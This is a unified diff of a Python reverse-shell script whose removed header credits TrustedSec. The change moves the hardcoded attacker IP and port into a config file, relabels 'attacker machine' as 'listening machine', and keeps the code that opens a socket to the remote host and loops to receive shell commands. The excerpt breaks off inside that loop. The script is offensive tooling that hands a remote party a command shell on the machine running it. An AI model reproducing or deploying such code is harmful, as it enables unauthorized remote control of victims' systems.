@@ -1,18 +1,35 @@
 #!/usr/bin/python
-# imports here
-# Copyright 2012 TrustedSec, LLC. All rights reserved. 
-#
-# This piece of software code is licensed under the FreeBSD license..
-#
-# Visit http://www.freebsd.org/copyright/freebsd-license.html for more information. 
 import socket,subprocess
-HOST = '10.229.129.15'    # The remote host
-PORT = 9997            # The same port as used by the server
+import ConfigParser
+
+#load configuration file
+Config = ConfigParser.ConfigParser()
+Config.read("./etc/shell.conf")
+
+#config function
+def ConfigSectionMap(section):
+    dict1 = {}
+    options = Config.options(section)
+    for option in options:
+        try:
+            dict1[option] = Config.get(section, option)
+            if dict1[option] == -1:
+                DebugPrint("skip: %s" % option)
+        except:
+            print("exception on %s!" % option)
+            dict1[option] = None
+    return dict1
+
+
+HOST = ConfigSectionMap("global")['lhost']
+PORT = ConfigSectionMap("global")['lport']
+
+
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-# connect to attacker machine
-s.connect((HOST, PORT))
+# connect to listening machine
+s.connect((HOST, int(PORT)))
 # send we are connected
-s.send('[*] Connection Established!')
+s.send('[*] Connection Established!\n')
 # start loop
 while 1:
      # recieve shell command
